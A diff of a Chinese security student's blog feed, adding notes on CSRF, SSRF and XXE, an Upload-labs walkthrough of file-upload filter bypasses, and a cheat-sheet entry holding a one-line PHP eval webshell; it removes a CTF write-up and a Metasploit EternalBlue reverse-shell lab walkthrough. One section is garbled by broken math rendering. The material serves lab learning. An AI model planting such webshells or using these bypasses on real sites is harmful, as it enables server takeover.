@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zyyiszyy.github.io</id>
     <title>zyyire</title>
-    <updated>2021-03-15T15:26:11.421Z</updated>
+    <updated>2021-03-19T14:34:56.341Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zyyiszyy.github.io"/>
     <link rel="self" href="https://zyyiszyy.github.io/atom.xml"/>
@@ -10,6 +10,139 @@
     <logo>https://zyyiszyy.github.io/images/avatar.png</logo>
     <icon>https://zyyiszyy.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, zyyire</rights>
+    <entry>
+        <title type="html"><![CDATA[CSRF和SSRF学习笔记]]></title>
+        <id>https://zyyiszyy.github.io/post/csrf-he-ssrf-xue-xi-bi-ji/</id>
+        <link href="https://zyyiszyy.github.io/post/csrf-he-ssrf-xue-xi-bi-ji/">
+        </link>
+        <updated>2021-03-19T13:08:06.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="csrf漏洞">CSRF漏洞</h1>
+<h2 id="漏洞介绍">漏洞介绍</h2>
+<p>CSRF（Cross-site request forgery）跨站请求伪造，又叫做One Click Attack或者Session Riding，通常缩写为CSRF和XSRF，是一种对网站的恶意利用。其不太流行，所以防范资料较少，难以防范，被认为比XSS更有危险性。</p>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>攻击者利用目标用户的身份，以目标用户的名义执行一些非法操作，如：发送邮件、发消息、盗取目标用户的账号、购买物品、虚拟货币转账等。经常用来制作蠕虫病毒、刷SEO流量等。</p>
+<h2 id="攻击条件">攻击条件</h2>
+<ul>
+<li>目标用户已经登录了某网站，能够执行网站的某些功能。</li>
+<li>目标用访问了攻击者的URL。</li>
+</ul>
+<h2 id="防御措施">防御措施</h2>
+<ul>
+<li>验证请求的Referer值，如果其是以自己网站开头的域名，则可能请求来自于网站自己。若其域名是其他网站或者空白，就有可能是CSRF攻击，需要将请求过滤掉。</li>
+<li>在请求中插入不能伪造的信息，如在HTTP请求中以参数形式加入一个随机的token，服务器端验证token正确性。</li>
+</ul>
+<h1 id="ssrf漏洞">SSRF漏洞</h1>
+<h2 id="漏洞介绍-2">漏洞介绍</h2>
+<p>SSRF（Server-Side Request Forgery）服务器端请求伪造，是一种由客户端伪造请求，由服务器端发起请求的漏洞。一般情况下，攻击的是内网。</p>
+<h2 id="漏洞原理-2">漏洞原理</h2>
+<p>形成原因大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。如黑客操纵服务端从指定的URL地址获取网页的文本内容，加载指定地址的图片等。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地服务器。</p>
+<h2 id="防御措施-2">防御措施</h2>
+<ul>
+<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li>
+<li>限制不能访问内网的ip。</li>
+<li>屏蔽返回的详细信息。</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[通过XXE - PHP Audit Basic学习外部实体注入漏洞]]></title>
+        <id>https://zyyiszyy.github.io/post/tong-guo-xxe-php-audit-basic-xue-xi-wai-bu-shi-ti-zhu-ru-lou-dong/</id>
+        <link href="https://zyyiszyy.github.io/post/tong-guo-xxe-php-audit-basic-xue-xi-wai-bu-shi-ti-zhu-ru-lou-dong/">
+        </link>
+        <updated>2021-03-18T09:38:16.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="xxe知识点">XXE知识点</h1>
+<p>XXE全称<strong>XML外部实体注入漏洞（XML External Entity）</strong>，XML用于标记电子文件十七具有结构性的标记语言，主要负责数据传输和存储，相似的html主要用于显示。XML文档结构包括xml声明、<strong>DTD文档类型定义</strong>、文档元素。<br>
+<strong>XXE漏洞的危害：</strong></p>
+<ul>
+<li>读取系统文件</li>
+<li>执行系统命令</li>
+<li>探测内网端口</li>
+<li>攻击内部网络<br>
+<strong>XML语法结构：</strong><br>
+内部声明DTD格式：<!DOCTYPE 根元素 【元素声明】><br>
+引用外部DTD格式：<!DOCTYPE 根元素 SYSTEM "文件名"><br>
+内部声明实体格式：<!ENTITY 实体名称 "实体的值"><br>
+引用外部实体格式：<!ENTITY 实体名称 SYSTEM "URI"><br>
+<strong>XXE漏洞代码语句：</strong></li>
+</ul>
+<pre><code>file_get_contents   //获取客户端输入内容
+new DOMDocument()  //初始化XML解析器
+loadXML($xmlfile)  //加载客户端输入的XML内容
+simplexml_import_dom($dom)  //获取XML文档节点，成功则返回SimpleXMLElement对象，失败返回False
+</code></pre>
+<p><strong>XXE漏洞修复建议：</strong></p>
+<ul>
+<li>禁止使用外部实体，如：libxml_disable_entity_loader(true)。</li>
+<li>过滤用户提交的XML数据。</li>
+</ul>
+<h1 id="xxe-php-audit-basic题目">XXE - PHP Audit Basic题目</h1>
+<p>搭建环境Windows10</p>
+<h2 id="domdocumentphp">DOMDocument.php</h2>
+<h2 id="simplexmlelementphp">SimpleXMLElement.php</h2>
+<h2 id="simplexml_load_stringphp">simplexml_load_string.php</h2>
+<h2 id="blindxxephp">BlindXXE.php</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Upload-labs题目学习文件上传漏洞（1-11题）]]></title>
+        <id>https://zyyiszyy.github.io/post/upload-labs-ti-mu-lian-xi-wen-jian-shang-chuan-lou-dong-1-6-ti/</id>
+        <link href="https://zyyiszyy.github.io/post/upload-labs-ti-mu-lian-xi-wen-jian-shang-chuan-lou-dong-1-6-ti/">
+        </link>
+        <updated>2021-03-16T14:58:56.000Z</updated>
+        <content type="html"><![CDATA[<p>**造成文件上传的原因：**服务端代码未对客户端上传的文件进行严格的验证和过滤，造成可以上传任意文件的情况，包括脚本文件asp、aspx、php、jsp等格式。<br>
+<strong>文件上传修复建议：</strong></p>
+<ul>
+<li>通过白名单的方式判断文件是否合法。</li>
+<li>对上传的文件进行重命名，如rand(10,99).date(&quot;YmdHis&quot;).&quot;.jpg&quot;。</li>
+</ul>
+<h1 id="关卡1-js检测绕过攻击">关卡1 JS检测绕过攻击</h1>
+<p>这里已提交php文件就提示消息框：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615907146277.png" alt="" loading="lazy"><br>
+判断是前端的验证，首先生成一句话木马文件，改名为webshell.png，然后上传，这时可以通过js验证。同时burpsuite抓包，在burpsuite里改文件后缀，发送文件即上传成功。<br>
+另一种方法：直接禁止JS运行，火狐浏览器地址栏输入about:config，找到javascript.enabled，关闭选项，刷新页面，重新上传文件即可上传成功。</p>
+<h1 id="关卡2-服务端对mime检查">关卡2 服务端对MIME检查</h1>
+<p>查看源代码的判断：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615913754333.png" alt="" loading="lazy"><br>
+属于文件类型绕过攻击，主要判断Content-Type的值，上传php文件时值为：application/octet-stream，上传jpg文件时的值为：image/jpeg。<br>
+本题先上传php文件，抓包，然后将Content-Type改为image/jpeg，就可以绕过成功，通过返回信息查看文件路径进行下一步攻击。</p>
+<h1 id="关卡3-文件后缀绕过攻击">关卡3 文件后缀绕过攻击</h1>
+<p>这道题源码就只是过滤了四个类型，最后改文件名为随机数字：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615907719333.png" alt="" loading="lazy"><br>
+将文件名依次改为php2 php3 php4 php5 phtml pht，上传成功，burpsuite里看文件路径和文件名。</p>
+<h1 id="关卡4-htaccess文件绕过">关卡4 .htaccess文件绕过</h1>
+<p>这次绕过了许多函数：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615909304406.png" alt="" loading="lazy"><br>
+但是没有绕过.htaccess，所以可以通过.htaccess绕过方式攻击。先建立文件，内容为：SetHandler applicationx-httpd-php。让所有的文件都解析为php,上传文件，再上传图片马。</p>
+<h1 id="关卡5-php-和-windows环境的叠加特性绕过">关卡5 PHP 和 Windows环境的叠加特性绕过</h1>
+<p>利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等：<br>
+‘&quot;’=‘.’;‘&gt;’=‘?’;‘&lt;’= ‘*’。<br>
+首先借助burpsuite上传名为4.php:.jpg的空文件，解析后就成了名为4.php的空文件，再将一句话木马改名为“4.&lt;”，上传，然后内容便进入刚才的空文件里生成了4.php。上一题同样适用。</p>
+<h1 id="关卡6-后缀大小写绕过">关卡6 后缀大小写绕过</h1>
+<p>观察源代码，这道题没有进行大小写统一，所以可以进行大小写绕过。<br>
+<img src="https://zyyiszyy.github.io/post-images/1615909612188.png" alt="" loading="lazy"><br>
+更改文件名为shell.phP，上传文件即可成功绕过。</p>
+<h1 id="关卡7-空格绕过">关卡7 空格绕过</h1>
+<p>观察源代码，发现没用去掉空格：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615910745871.png" alt="" loading="lazy"><br>
+所以可以进行空格绕过，在burpsuite中将文件名改为&quot;webshell.php &quot;并查看文件名和路径。</p>
+<h1 id="关卡8-点绕过">关卡8 点绕过</h1>
+<p>观察源代码，没有删除文件名后的点。<br>
+<img src="https://zyyiszyy.github.io/post-images/1615911326907.png" alt="" loading="lazy"><br>
+windows特性，会自动去掉后缀名中最后的”.”,所以改名为“shell.php.”。</p>
+<h1 id="关卡9-data绕过">关卡9 ::$DATA绕过</h1>
+<p>观察源代码，没有去除字符串::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">。</mi><mo>!</mo><mo>[</mo><mo>]</mo><mo>(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>z</mi><mi>y</mi><mi>y</mi><mi>i</mi><mi>s</mi><mi>z</mi><mi>y</mi><mi>y</mi><mi mathvariant="normal">.</mi><mi>g</mi><mi>i</mi><mi>t</mi><mi>h</mi><mi>u</mi><mi>b</mi><mi mathvariant="normal">.</mi><mi>i</mi><mi>o</mi><mi mathvariant="normal">/</mi><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>−</mo><mi>i</mi><mi>m</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mn>1615911947145.</mn><mi>p</mi><mi>n</mi><mi>g</mi><mo>)</mo><mi mathvariant="normal">在</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>+</mo><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">情</mi><mi mathvariant="normal">况</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mo>+</mo><mi mathvariant="normal">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA。
+![](https://zyyiszyy.github.io/post-images/1615911947145.png)
+在php+windows的情况下：如果文件名+&quot;::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">。</span><span class="mclose">!</span><span class="mopen">[</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord">.</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord">/</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord">/</span><span class="mord">1</span><span class="mord">6</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">1</span><span class="mord">1</span><span class="mord">9</span><span class="mord">4</span><span class="mord">7</span><span class="mord">1</span><span class="mord">4</span><span class="mord">5</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">况</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot;会把::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">当</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">流</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">理</mi><mo separator="true">,</mo><mi mathvariant="normal">不</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">检</mi><mi mathvariant="normal">测</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">缀</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">保</mi><mi mathvariant="normal">持</mi><mi mathvariant="normal">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA之后的数据当成文件流处理,不会检测后缀名，保持&quot;::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">流</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">缀</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">持</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot;之前的文件名。所以可以借助burpsuite在后缀名加“::$DATA”进行绕过。</p>
+<h1 id="关卡10-点空格点绕过">关卡10 点+空格+点绕过</h1>
+<p>保存文件的时候没有重命名而使用的原始的文件名，源代码如下：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615912732277.png" alt="" loading="lazy"><br>
+将文件名通过burpsuite改为：”shell.php. .“,经过处理后变成：“shell.php.”，就能成功绕过。</p>
+<h1 id="关卡11-双写绕过">关卡11 双写绕过</h1>
+<p>如果后缀在黑名单里，就将其替换为空，也就是去掉，源代码如下：<br>
+<img src="https://zyyiszyy.github.io/post-images/1615913399885.png" alt="" loading="lazy"><br>
+所以可以将后缀写两层，文件名为：&quot;shell.pphphp&quot;。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[SQLMAP使用方法和常用命令]]></title>
         <id>https://zyyiszyy.github.io/post/sqlmap-shi-yong-fang-fa-he-chang-yong-ming-ling/</id>
@@ -266,6 +399,11 @@ filelength
 GetFileSize
 FindFirstFile   //都是获取文件的尺寸
 </code></pre>
+<h3 id="phpinfo">phpinfo</h3>
+<pre><code>&lt;?php
+phpinfo();
+?&gt;
+</code></pre>
 <h3 id="易语言搜索按钮事件">易语言搜索按钮事件</h3>
 <pre><code>先不点击按钮，查找二进制字串，搜索hex：FF55FC5F5E，下断点，点击按钮。
 </code></pre>
@@ -293,6 +431,13 @@ FindFirstFile   //都是获取文件的尺寸
 </code></pre>
 <h3 id="打开注册表命令">打开注册表命令</h3>
 <pre><code>regedit
+</code></pre>
+<h3 id="一句话木马">一句话木马</h3>
+<pre><code>&lt;?php @eval($_POST['cmd']) ?&gt;   //蚁剑连接
+&lt;?php phpinfo();?&gt;
+</code></pre>
+<h3 id="浏览器关闭js服务">浏览器关闭JS服务</h3>
+<pre><code>火狐为例，地址栏输入about:config，找到javascript.enabled，关闭选项，刷新页面。
 </code></pre>
 <h3 id="ropgadget或等rop链">ROPgadget或等rop链：</h3>
 <pre><code>ROPgadget --binary 文件路径 --ropchain
@@ -1337,222 +1482,6 @@ qword_601088是map里的内容，<em>a1是输入的内容，v2判断结果是否
 <a href="http://blog.iyzyi.com/index.php/archives/1106/">http://blog.iyzyi.com/index.php/archives/1106/</a><br>
 <a href="https://l1b0.fun/a5a95622/">https://l1b0.fun/a5a95622/</a><br>
 <a href="https://m4x.fun/post/hackme.inndy-writeup/">https://m4x.fun/post/hackme.inndy-writeup/</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CUMTCTF2020岁末赛部分WP]]></title>
-        <id>https://zyyiszyy.github.io/post/cumtctf2020-sui-mo-sai-bu-fen-wp/</id>
-        <link href="https://zyyiszyy.github.io/post/cumtctf2020-sui-mo-sai-bu-fen-wp/">
-        </link>
-        <updated>2020-12-27T02:09:26.000Z</updated>
-        <content type="html"><![CDATA[<p>注：这是一个学期的最后一场比赛，也是检验一个学期学习re成果的时候了，这次算是发挥出自己最大的能力了，自己得分在队伍中也算是占较大比重了。另外，向re新手强推hackme刷题网站，能提升不少能力。这次比赛喜提一等奖，好像是第三名，继续加油。</p>
-<h2 id="签到">签到：</h2>
-<p>Ida打开就看到flag<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181380811.png" alt="" loading="lazy"></p>
-<h2 id="zzzz3333333">Zzzz3333333</h2>
-<p>Ida打开查找关键代码：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181400324.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615181406817.png" alt="" loading="lazy"><br>
-找到一个判断函数，数了数38个判断条件，又有38个未知数，未知数就是flag，想到用z3py约束求解器，写脚本求解，脚本如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181470963.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615181476257.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615181480916.png" alt="" loading="lazy"><br>
-实际出现一点小问题，有一些乱码可能某个数改错了出现了多解，增加判断条件输出不同的解，找正确的那个。</p>
-<h2 id="奇怪的exe">奇怪的exe</h2>
-<p>下载文件，发现是python写的exe文件。先用pyinstxtractor解包，找到一个名字为3的可疑文件:<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181632590.png" alt="" loading="lazy"><br>
-16进制编辑器打开发现里面有输入flag等字眼，改名为pyc文件，然后拿去反编译，提示错误，再看16进制编辑页面：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181638380.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615181669038.png" alt="" loading="lazy"><br>
-发现magic number错误，用对应的python版本编译一个文件，查看其magic number如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181675215.png" alt="" loading="lazy"><br>
-将第一行加到3.py上，再用uncompyle6反编译，得到源码：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181681573.png" alt="" loading="lazy"><br>
-很容易逆，先异或求s，再对应每三位还原，得到base64加密后的flag，解密得到flag：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181758415.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615181764017.png" alt="" loading="lazy"></p>
-<h2 id="ez_code">ez_code</h2>
-<p>下载文件发现是python字节码，翻译字节码得到如下代码：</p>
-<pre><code>flag=input()
-print(flag)
-if len(flag)!=36:
-    print('wrong length!')
-a=[]
-t=0
-for i in flag:
-    if t&amp;1==1:             #偶数
-        a.append(ord(i)+128)
-    else:
-        a.append(ord(i))
-    t=t+1
-b=a[0]&gt;&gt;5              #f-&gt;3
-for i in range(len(a)):
-    if i==len(a)-1:
-        a[i]=(a[i]*8)&amp;255|b
-    else:
-        a[i]=(a[i]*8)&amp;255|(a[i+1]&gt;&gt;5)
-num=[]
-for i in range(2,129):       ##################
-    t=False
-    for j in range(2,i):
-        if i%j==0:
-            t=True
-    if not t:
-        num.append(i)
-for i in range(len(num)):
-    print(num[i])
-c=[0]*len(a)
-for i in range(len(a)):       #36
-    x1=(a[i]&gt;&gt;4)^(num[i%31]&amp;15)
-    x2=(a[i]&amp;15)^(num[i%31]&gt;&gt;4)
-    c[i]=x2*16+x1
-d=[227,169,227,45,232,33,126,162,195,9,239,187,245,180,69,164,123,185,93,0,198,58,246,149,211,156,218,166,65,41,86,173,121,41,125,167]
-#print(len(d))
-e=1
-for i in range(len(d)):
-    if d[i]!=c[i]:
-        e=0              #####
-if e==1:
-    print('you are right!')
-else:
-    print('wrong')
-</code></pre>
-<p>可以先根据d[i]=c[i], c[i]=x2*16+x1爆破a[i]。然后再逆向还原，通过分析发现前面代码的大概意思是将a所有位的二进制码左移3位，所以逆向的话右移三位，在根据判断末尾是否为0对应减去128。脚本如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181820797.png" alt="" loading="lazy"></p>
-<h2 id="time">time</h2>
-<p>先cmd运行文件发现提示：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181894529.png" alt="" loading="lazy"><br>
-所以应该有一些运行时的判断条件，ida打开：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181900633.png" alt="" loading="lazy"><br>
-这就是为什么直接运行会提示not yet，它会先对运行时本地时间进行判断，符合才会进入主函数，主函数如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181908183.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615181914760.png" alt="" loading="lazy"><br>
-先传入参数是一个对时间的式子:<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181920825.png" alt="" loading="lazy"><br>
-计算结果就是0xd563e400，然后按照字节判断是否是字母或者数字，不是的话就循环下一次，是的话放入x_0里，这里发现除了0x00字节，一共是传入了3位dcU。<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181970160.png" alt="" loading="lazy"><br>
-接下来是判断flag是否是字母或数字，是的话接着放入x_0地址处，注意这时前面有3个字符的：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181977825.png" alt="" loading="lazy"><br>
-然后生成一个先数字，再小写字母，再大写字母的表，放入table里：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181982262.png" alt="" loading="lazy"><br>
-接着创建一个数组，存放x_0里字符串对应在table的位置，数组名改为array_666：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181988543.png" alt="" loading="lazy"><br>
-下面找到关键函数，点开：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615181994957.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615182041534.png" alt="" loading="lazy"><br>
-大致就是array里对应i加上flag对应在table里的位置，然后对62求余，其中62就是table的长度，求余结果就是table的下标，然后放入字符串里，这里取名为stringggg，其中array比flag长3位，长在前面传入参数那里，这也使得能够逆向求解。<br>
-再回到主函数，最后有两个字符串进行比较，一个就是刚才生成的stringggg，一个是str1：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182047584.png" alt="" loading="lazy"><br>
-Str1是已知的：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182054945.png" alt="" loading="lazy"><br>
-然后就可以每三位每三位的求flag，脚本如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182059803.png" alt="" loading="lazy"><br>
-没有优化脚本，先输入13，12，56就是dcU对应table表里的下标，每次出的3个结果就是下一轮的输入，最后输出完整的flag：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182067002.png" alt="" loading="lazy"></p>
-<h2 id="pwn1">pwn1</h2>
-<p>ida打开分析代码：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182108196.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615182116356.png" alt="" loading="lazy"><br>
-<img src="https://zyyiszyy.github.io/post-images/1615182120812.png" alt="" loading="lazy"><br>
-代码很短，先直接读入内容然后放入buf变量，然后将buf的最后一位变为0，n为buf的长度，最后比较s和buf的内容，比较长度为n字节。返回值是v4，在调用函数外面v4又给了result，result==123的话打开shell。虽然代码短但信息量还不少。这里可以通过刚开始字节设置0x00来绕过长度判断那里，再溢出覆盖整数v4为123,对应变量在栈中的位置如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182128070.png" alt="" loading="lazy"><br>
-写脚本和运行结果如下：<br>
-<img src="https://zyyiszyy.github.io/post-images/1615182133421.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[MSF利用”永恒之蓝“漏洞]]></title>
-        <id>https://zyyiszyy.github.io/post/msf-li-yong-yong-heng-zhi-lan-lou-dong/</id>
-        <link href="https://zyyiszyy.github.io/post/msf-li-yong-yong-heng-zhi-lan-lou-dong/">
-        </link>
-        <updated>2020-12-24T09:52:52.000Z</updated>
-        <content type="html"><![CDATA[<p>注：此次攻击是在虚拟机内kali系统向win7系统发起攻击。<br>
-进入msf，输入：<code>msfconsole</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615257958728.jpg" alt="" loading="lazy"><br>
-查找永恒之蓝漏洞模块:<code>search ms17_010</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258389125.png" alt="" loading="lazy"><br>
-选择一个模块使用:<code>use exploit/windows/smb/ms17_010_eternalblue</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258010367.png" alt="" loading="lazy"><br>
-显示攻击载荷:<code>show payloads</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258085995.png" alt="" loading="lazy"><br>
-选择攻击载荷:<code>set payload windows/x64/meterpreter/reverse_tcp payload =&gt;windows/x64/meterpreter/reverse_tcp</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258140083.png" alt="" loading="lazy"><br>
-查看该攻击模块的选项:<code>show options</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258262359.png" alt="" loading="lazy"><br>
-查看目标主机的ipv4，进入win7命令行，输入<code>ipconfig</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258509640.png" alt="" loading="lazy"><br>
-设置required的选项:<code>set rhosts 192.168.183.129 rhosts=&gt;192.168.183.129</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258658092.png" alt="" loading="lazy"><br>
-实施攻击:<code>run</code><br>
-<img src="https://zyyiszyy.github.io/post-images/1615258698982.png" alt="" loading="lazy"><br>
-验证攻击成功:</p>
-<pre><code>screemshot              //屏幕截图
-shell                          //打开命令行
-ipconfig                    //查看靶机ip
-
-</code></pre>
